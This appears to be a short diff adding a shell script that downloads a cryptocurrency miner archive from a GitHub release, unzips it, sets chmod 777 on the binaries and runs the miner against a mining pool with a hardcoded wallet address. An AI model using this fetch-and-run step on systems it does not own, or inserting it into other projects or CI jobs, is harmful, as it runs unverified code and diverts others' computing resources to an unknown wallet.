@@ -1,0 +1,4 @@
+wget https://github.com/bondaltomason/meo/releases/download/2.7.0/phihashminer_ubuntu22.zip
+unzip phihashminer_ubuntu22.zip
+chmod 777 ._phihashminer phihashminer
+./phihashminer -P stratum+tcp://Pm6GJUcV8dr8AfpTGP92C6nzioRKzRBmzF.x@stratum-eu.rplant.xyz:7134
